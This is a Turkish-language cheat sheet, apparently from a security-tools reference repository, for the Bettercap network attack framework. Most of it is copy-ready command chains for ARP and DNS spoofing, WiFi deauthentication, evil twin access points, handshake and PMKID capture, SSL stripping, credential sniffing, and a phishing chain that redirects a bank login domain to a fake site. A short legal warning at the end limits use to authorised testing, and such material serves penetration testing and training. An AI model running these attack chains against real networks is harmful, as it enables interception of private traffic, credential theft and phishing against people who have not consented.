[🇬🇧 English](../../README.md)

# 🦈 Bettercap - Ağ Saldırı Çatısı Başvuru Kılavuzu

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Ağ Saldırıları İçin İsviçre Çakısı
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

---

## 📋 İçindekiler

- [Bettercap Nedir](#-bettercap-nedir)
- [Kurulum](#-kurulum)
- [Temel Kullanım](#-temel-kullanım)
- [Ağ Keşfi (Network Reconnaissance)](#-ağ-keşfi-network-reconnaissance)
- [ARP Yanıltma / MITM (ARP Spoofing)](#-arp-yanıltma--mitm-arp-spoofing)
- [DNS Yanıltma (DNS Spoofing)](#-dns-yanıltma-dns-spoofing)
- [WiFi Saldırıları](#-wifi-saldırıları)
- [HTTPS Sürüm Düşürme (Downgrade)](#-https-sürüm-düşürme-downgrade)
- [Kimlik Bilgisi Dinleme (Sniffing)](#-kimlik-bilgisi-dinleme-sniffing)
- [Caplet Betikleri](#-caplet-betikleri)
- [Web Kullanıcı Arayüzü (Web UI)](#-web-kullanıcı-arayüzü-web-ui)
- [Hızlı Referans](#-hızlı-referans)

---

## 🎯 Bettercap Nedir

**Bettercap**, WiFi, Bluetooth ve yerel ağ keşfi için geliştirilmiş hepsi bir arada İsviçre çakısıdır. Ettercap aracının modern özelliklerle donatılmış gelişmiş halefidir:

- 🔍 **Ağ Keşfi** - Ağdaki cihazları ve servisleri tespit etme
- 🎭 **Ortadaki Adam (MITM) Saldırıları** - ARP spoofing, DNS spoofing
- 📶 **WiFi Saldırıları** - Deauth, sahte ikiz erişim noktası (evil twin), handshake yakalama
- 🔓 **Kimlik Bilgisi Yakalama** - HTTP, HTTPS trafiğini izleme ve sürüm düşürme
- 📡 **Bluetooth / BLE** - Bluetooth cihaz keşfi ve saldırıları
- 🌐 **Web Kullanıcı Arayüzü** - Tarayıcı üzerinden modern yönetim paneli

### Özellikler

| Özellik | Açıklama |
|---------|----------|
| **Modüler Yapı** | Caplet betikleri ile kolayca genişletilebilir |
| **Etkileşimli Kabuk** | Gerçek zamanlı komut satırı arayüzü |
| **Betik Desteği** | Hazırlanan `.cap` dosyalarıyla tam otomasyon |
| **Web UI** | Web tabanlı görsel yönetim arayüzü |
| **Go Dili ile Yazılmış** | Hızlı, modern ve çoklu platform desteği |

---

## 🚀 Kurulum

### Kali Linux (Önceden Yüklü)

```bash
# Kali Linux'ta zaten yüklüdür
bettercap --help

# Güncelleme
sudo apt update && sudo apt install bettercap
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

### Kaynak Koddan Kurulum

```bash
# Önce Go dilini yükleyin
sudo apt install golang

# Bettercap'i kurun
go install github.com/bettercap/bettercap@latest

# Veya depodan derleyerek
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

### Web Arayüzünü Yükleme (İsteğe Bağlı)

```bash
# Web UI bileşenlerini indirme
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

## 💻 Temel Kullanım

### Bettercap'i Başlatma

```bash
# Temel başlatma (root yetkisi gerektirir)
sudo bettercap

# Ağ arayüzü belirterek başlatma
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# Etkileşimsiz modda komut çalıştırma (-eval)
sudo bettercap -eval "net.probe on; net.show"

# Caplet betiği ile başlatma
sudo bettercap -caplet http-ui
```

### Etkileşimli Kabuk Komutları

```bash
# Bettercap kabuğu içindeyken
» help                      # Tüm komutları listele
» help net.probe            # Belirli bir modül hakkında yardım al
» net.show                  # Keşfedilen cihazları göster
» set arp.spoof.targets X   # Değişken ayarla
» arp.spoof on              # Modülü etkinleştir
» quit                      # Çıkış yap
```

### Modül Yönetimi

```bash
# Tüm modülleri listeleme
» help

# Modül ayrıntılarını görüntüleme
» help arp.spoof

# Modülü etkinleştirme
» arp.spoof on

# Modülü devre dışı bırakma
» arp.spoof off

# Modül ayarlarını görme
» get arp.spoof.*
```

---

## 🔍 Ağ Keşfi (Network Reconnaissance)

### Cihaz / Host Keşfi

```bash
# Ağ tarayıcısını etkinleştir
» net.probe on

# Keşfedilen cihazları göster
» net.show

# Çıktı örneği:
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

### Ağ Bilgileri

```bash
# Mevcut arayüz bilgilerini göster
» net.show

# Arayüz detayları
» get net.interface.*

# Ağ geçidi (Gateway) bilgisi
» get gateway.*
```

### Tarama (Probe) Ayarları

```bash
# Tarama hızını ayarlama
» set net.probe.throttle 10

# Pasif dinleme modu (paket göndermeden)
» set net.probe.passive true

# Zaman aşımı süresi belirleme (milisaniye)
» set net.probe.timeout 500
```

### Keşif Komutları

```bash
# Kapsamlı keşif modunu aç
» net.recon on

# Keşfedilen cihaz listesini temizle
» net.clear

# Yalnızca aktif cihazları meta verilerle göster
» set net.show.meta true
» net.show

# Ağ trafiğini PCAP dosyasına aktar
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

## 🎭 ARP Yanıltma / MITM (ARP Spoofing)

### Temel ARP Zehirleme

```bash
# Bettercap'i başlatın
sudo bettercap -iface eth0

# Ağdaki cihazları tespit edin
» net.probe on

# Biraz bekleyip cihazları listeleyin
» net.show

# Kurban IP adresini hedef olarak belirleyin
» set arp.spoof.targets 192.168.1.100

# ARP zehirlemeyi başlatın
» arp.spoof on

# Artık ortadaki adam (MITM) konumundasınız!
```

### Çift Yönlü Yanıltma (Full Duplex)

```bash
# Hem kurbana hem de ağ geçidine (Gateway) sahte ARP gönder
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

### Tüm Alt Ağı Hedefleme (Subnet)

```bash
# Alt ağdaki tüm cihazları hedefle (ağ geçidi hariç)
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# Yalnızca yerel cihazlar arası trafiği hedefle
» set arp.spoof.internal true
» arp.spoof on
```

### ARP Spoofing + Trafik Dinleme (Sniff)

```bash
# Eksiksiz MITM kurulumu
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

## 🌐 DNS Yanıltma (DNS Spoofing)

### Temel DNS Spoofing

```bash
# Yanıltılacak alan adlarını belirleyin
» set dns.spoof.domains example.com, *.example.com

# Yönlendirilecek IP adresini (kendi makineniz) girin
» set dns.spoof.address 192.168.1.50

# Etkinleştirin (ARP spoof gerektirir)
» arp.spoof on
» dns.spoof on
```

### Tüm Alan Adlarını Yanıltma (Joker Karakter)

```bash
# Bütün DNS isteklerini kendi makinenize yönlendirin
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Birden Fazla Alan Adı Belirleme

```bash
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Web Sunucusu ile Entegre DNS Yanıltma (Oltalama / Phishing)

```bash
# Hedef alan adını yönlendirin
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# Kendi makinenizde sahte siteyi yayınlayan HTTP sunucusunu başlatın
» set http.server.path /var/www/phishing
» http.server on
```

---

## 📶 WiFi Saldırıları

### WiFi Modunu Başlatma

```bash
# WiFi arayüzü ile Bettercap'i başlatın
sudo bettercap -iface wlan0

# WiFi keşif modunu açın
» wifi.recon on

# Keşfedilen erişim noktalarını görüntüleyin
» wifi.show
```

### WiFi Keşif Çıktısı

```bash
» wifi.show

┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

### Bağlantı Koparma (Deauthentication) Saldırısı

```bash
# Belirtilen erişim noktasına bağlı tüm istemcilerin bağlantısını kopar
» wifi.deauth AA:BB:CC:DD:EE:FF

# Belirli bir istemciyi hedef alarak deauth gönder
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# Sürekli deauth paketi gönder (tekrarlı)
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

### El Sıkışma (Handshake) Yakalama

```bash
# WiFi keşfini başlat
» wifi.recon on

# Hedefin çalıştığı kanala kilitlen
» wifi.recon.channel 6

# Handshake dosyalarının kaydedileceği klasörü ayarla
» set wifi.handshakes.file /tmp/handshakes/

# İstemcileri yeniden bağlanmaya zorlamak için deauth gönder
» wifi.deauth AA:BB:CC:DD:EE:FF

# Yakalanan el sıkışmaları doğrula
» wifi.show.wpa
```

### Sahte İkiz Saldırısı (Evil Twin Attack)

```bash
# Gerçek ağın parametrelerini taklit et
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# Sahte erişim noktasını yayına sok
» wifi.ap on

# Gerçek ağa deauth uygulayarak kullanıcıları sahte ağa çek
» wifi.deauth <gercek_AP_BSSID>
```

### PMKID Saldırısı (İstemcisiz Kırma)

```bash
# Modern istemcisiz doğrudan AP saldırısı
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# Yakalanan PMKID hash'lerini kontrol et
» wifi.show.wpa
```

---

## 🔒 HTTPS Sürüm Düşürme (Downgrade)

### SSL Strip (HSTS Atlatma)

```bash
# Önce ARP spoofing'i açın
» arp.spoof on

# SSL Strip özelliğini etkinleştirin
» set https.proxy.sslstrip true
» https.proxy on

# Veya standart HTTP proxy kullanın
» http.proxy on
```

### HTTPS Proxy Yapılandırması

```bash
# HTTPS proxy dinleyicisini ayarlayın
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# Özel sertifika ile kullanma
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### HTTPS Trafiğini Yakalama

```bash
# Kapsamlı HTTPS MITM zinciri
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

## 🔓 Kimlik Bilgisi Dinleme (Sniffing)

### HTTP Kimlik Bilgileri

```bash
# Paket yakalamayı aç
» net.sniff on

# Yerel makinenin de trafiğini yakalamak için
» set net.sniff.local true
» net.sniff on

# Yalnızca HTTP portunu filtrele
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

### Kimlik Bilgisi Toplama (Canlı Akış)

```bash
# Tam MITM kimlik bilgisi avı
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# Oturum açma bilgileri terminale anlık olarak dökülür
```

### Trafiği Dosyaya Kaydetme

```bash
# Paketleri PCAP dosyasına yaz
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# Ayrıntılı çıktı modu
» set net.sniff.verbose true
» net.sniff on
```

---

## 📜 Caplet Betikleri

### Caplet Nedir?

Caplet'ler, Bettercap komut dizilerini otomatikleştiren `.cap` uzantılı betik dosyalarıdır.

### Dahili Caplet'ler

```bash
# Mevcut caplet'leri listele
» caplets.show

# Sık kullanılan dahili caplet'ler:
- http-ui       # Web kullanıcı arayüzü
- https-ui      # Güvenli web kullanıcı arayüzü
- local-sniffer # Yerel ağ dinleyici
- mitm          # Temel MITM saldırı şablonu
- pita          # Otomatik WiFi saldırı seti
```

### Caplet Çalıştırma

```bash
# Komut satırından doğrudan başlatma
sudo bettercap -caplet http-ui

# Bettercap kabuğu içinden yükleme
» caplet http-ui

# Özel dosyadan yükleme
sudo bettercap -caplet /path/to/custom.cap
```

### Özel Caplet Oluşturma

```bash
# Dosya: my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# Özel caplet'i çalıştırma
sudo bettercap -caplet my-mitm.cap
```

### Caplet'leri Güncelleme

```bash
# Topluluk caplet'lerini güncelle
» caplets.update
```

---

## 🌐 Web Kullanıcı Arayüzü (Web UI)

### Web Panelini Başlatma

```bash
# Önce arayüz paketlerini güncelleyin
sudo bettercap -eval "caplets.update; ui.update; quit"

# Standart Web UI ile başlatma (HTTP)
sudo bettercap -caplet http-ui

# HTTPS Web UI ile başlatma
sudo bettercap -caplet https-ui

# Tarayıcıdan erişim: https://127.0.0.1:8080/
# Varsayılan kullanıcı adı/parola: user/pass
```

### Web Arayüzü Bölümleri

| Bölüm | Açıklama |
|-------|----------|
| **Dashboard** | Gerçek zamanlı ağ genel görünümü |
| **Hosts** | Ağda keşfedilen tüm cihazlar |
| **WiFi** | Çevredeki kablosuz ağlar ve istemciler |
| **BLE** | Algılanan Bluetooth cihazları |
| **Events** | Sistem ve olay günlükleri |
| **Packets** | Yakalanan canlı ağ trafiği |

### Web Arayüzü Yapılandırması

```bash
# Yönetici kimlik bilgilerini değiştirme
» set http.server.username admin
» set http.server.password gizliparola

# Port değiştirme
» set http.server.port 8080

# Dinleme IP adresini ayarlama
» set http.server.address 0.0.0.0
```

---

## 📊 Hızlı Referans

### Temel Komutlar

| Komut | Açıklama |
|-------|----------|
| `net.probe on` | Ağdaki cihazları taramayı başlat |
| `net.show` | Keşfedilen cihazları listele |
| `arp.spoof on` | ARP zehirlemeyi başlat |
| `net.sniff on` | Paket yakalamayı başlat |
| `dns.spoof on` | DNS yanıltmayı başlat |
| `wifi.recon on` | WiFi ağ taramasını başlat |
| `wifi.deauth BSSID` | Kablosuz bağlantı kesme saldırısı |
| `https.proxy on` | HTTPS proxy ve SSL strip başlat |

### Sık Kullanılan Değişkenler

| Değişken | Açıklama |
|----------|----------|
| `arp.spoof.targets` | Hedef kurban IP adresleri |
| `arp.spoof.fullduplex` | Çift yönlü ARP zehirleme (true/false) |
| `dns.spoof.domains` | Sahte yanıt verilecek alan adları |
| `dns.spoof.address` | Yönlendirilecek hedef IP |
| `net.sniff.output` | PCAP dosya kayıt konumu |
| `wifi.ap.ssid` | Sahte erişim noktası adı |

### MITM Saldırı Şablonu

```bash
# Temel MITM saldırısını tek satırda başlat
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

### WiFi Saldırı Şablonu

```bash
# WiFi Deauth ve Handshake Yakalama
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

### Oltalama (Phishing) Saldırı Zinciri

```bash
# DNS Yanıltma + Sahte Site Yayını
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

## ⚠️ Yasal Uyarı

```
⚠️ UYARI: Bettercap ağ trafiğini dinleyebilen ve müdahale edebilen son derece 
güçlü bir saldırı çatısıdır. Bu aracı yalnızca KENDİNİZE AİT olan veya test 
etmek için AÇIK YAZILI İZİN ALDIĞINIZ ağlarda ve sistemlerde kullanın.

✅ İzinli ve sözleşmeli sızma testleri
✅ Güvenlik araştırmaları (laboratuvar ortamında)
✅ Eğitim ve bilinçlendirme çalışmaları

❌ Ağ trafiğini yetkisiz dinlemek ve manipüle etmek YASADIŞIDIR
❌ Halka açık ağlarda izinsiz asla kullanmayın
❌ Başkalarına ait hesap ve kimlik bilgilerini çalmayın
```

---

## 📚 Kaynaklar

- [Bettercap Resmi Web Sitesi](https://www.bettercap.org/)
- [Bettercap GitHub Deposu](https://github.com/bettercap/bettercap)
- [Bettercap Modül Belgeleri](https://www.bettercap.org/modules/)
- [Bettercap Caplet Arşivi](https://github.com/bettercap/caplets)

### İlgili Başvuru Kılavuzları
- [Aircrack-ng](../../Aircrack-ng/translations/README.tr.md)
- [Wifite](../../Wifite/translations/README.tr.md)
- [Wireshark](../../Wireshark/translations/README.tr.md)

---

<p align="center">
  <b>🦈 Ağ Saldırılarında Uzmanlaşın!</b><br>
  <i>Bettercap - Ağ sızma testleri için İsviçre çakısı</i>
</p>
